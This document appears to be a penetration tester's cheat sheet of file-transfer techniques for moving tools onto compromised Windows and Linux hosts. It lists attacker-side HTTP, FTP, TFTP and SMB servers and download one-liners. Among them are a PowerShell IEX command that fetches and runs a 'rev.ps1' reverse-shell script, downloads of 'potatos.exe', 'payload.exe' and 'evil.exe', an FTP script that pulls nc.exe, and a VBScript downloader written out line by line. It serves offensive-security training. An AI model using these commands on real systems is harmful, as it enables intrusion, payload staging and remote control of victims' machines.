## Transfer files (HTTP)

python2 -m SimpleHTTPServer 8000

python3 -m http.server 8000

## Transfer files (HTTP)

php -S 127.0.0.1:8080

## Transfer files (FTP)

python3 -m pyftpdlib -p 21

## Transfer file (FTP/msf)

msf> use auxiliary/server/ftp

## Transfer file (TFTP/msf)

msf> use auxilitary/server/tftp

## Windows ( Download TFTP )

tftp -i xxx.xxx.xxx.xxx GET filename.exe\
tftp -i xxx.xxx.xxx.xxx PUT filename.exe

## Windows ( Enable TFTP)

pkgmgr /iu:"TFTP"

## SMB service (Impacket)

python smbserver.py SHARE /root/shells

# Mount windows fileshare                                                                                                                                                                                                                                                               
                                                                                                                                                                                                                                                                                        New-PSDrive -Name "FolderName" -PSProvider "Filesystem" -Root "\\xxx..xxx.xxx\sharename"                                                                                                                                                                                                

## Copy files (SMB service)

copy \\\xxx.xxx.xxx.xxx\\SHARE .

## Windows ( Download HTTP )

powershell "IEX(New-Object Net.WebClient).downloadString('http://xxx.xxx.xxx:8000/rev.ps1')"

(new-object System.Net.WebClient).Downloadfile("http://xxx.xx.xx.xx:8000/1.exe", "1.exe")

powershell -command "& { iwr http://xx.xx.xx.xx:8000/potatos.exe -OutFile potatos.exe }"

## Linux ( Download HTTP )

wget -O filename http://xxx.xxx.xxx/filename

curl -o filename http://xxx.xxx.xxx.xxx/filename

## FTP transfer

You can start FTP on linux box with this command

```sh
python3 -m pyftpdlib -p 21 
```

Then you can transfer with these commands

```sh
echo open 10.11.0.254 21> ftp.txt
echo USER anonymous>> ftp.txt
echo password>> ftp.txt
echo bin >> ftp.txt
echo GET nc.exe >> ftp.txt
echo bye >> ftp.txt

ftp -v -n -s:ftp.txt
```

## wget 

```sh
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http,varByteArray,strData,strBuffer,lngCounter,fs,ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET",strURL,False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile,True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1,1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs

#After you've created wget.vbs
cscript wget.vbs http://192.168.10.5/evil.exe evil.exe
```

## Download powershell

IWR -uri http://xx.xx.xx.xx/payload.exe -outfile payload.exe

